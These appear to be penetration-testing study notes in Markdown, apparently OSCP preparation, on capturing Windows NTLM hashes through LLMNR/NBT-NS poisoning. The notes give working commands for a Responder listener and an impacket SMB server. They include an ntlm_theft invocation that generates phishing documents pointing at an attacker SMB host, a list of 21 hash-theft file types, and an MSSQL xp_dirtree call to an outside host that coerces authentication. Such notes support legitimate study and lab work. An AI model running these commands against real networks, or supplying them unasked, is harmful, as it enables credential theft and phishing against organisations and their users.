### Responder
#### Definition
> Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.

#### SMB
>OSCP exam only allow Analyze mode by -Av
```
Listener:
sudo responder -I tun0 -v
impacket-smbserver xingdi Desktop -smb2support

Access:
\\IPv4 address\test || //ip/test
```
###### NTLM_THEFT (https://github.com/Greenwolf/ntlm_theft/tree/master):
ntlm_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network.
```
Browse to Folder Containing
.url – via URL field
.url – via ICONFILE field
.lnk - via icon_location field
.scf – via ICONFILE field (Not Working on Latest Windows)
autorun.inf via OPEN field (Not Working on Latest Windows)
desktop.ini - via IconResource field (Not Working on Latest Windows)

Open Document
.xml – via Microsoft Word external stylesheet
.xml – via Microsoft Word includepicture field
.htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
.docx – via Microsoft Word includepicture field
.docx – via Microsoft Word external template
.docx – via Microsoft Word frameset webSettings
.xlsx - via Microsoft Excel external cell
.wax - via Windows Media Player playlist (Better, primary open)
.asx – via Windows Media Player playlist (Better, primary open)
.m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
.jnlp – via Java external jar
.application – via any Browser (Must be served via a browser downloaded or won’t run)

python3 ntlm_theft.py -g all -s 192.168.45.172(The IP address of your SMB hash capture server) -f contracts
```
#### HTTP
```
http://ip/
```
##### Upload form to capture hash

![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/3223ac35-7d83-43f2-a1bf-794d6488bf4c)

#### MSSQL
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0d89e7ee-4d0a-420b-854e-2ab67c7f3a9a)
```
EXEC xp_dirtree '\\10.10.14.31\share', 1, 1
```

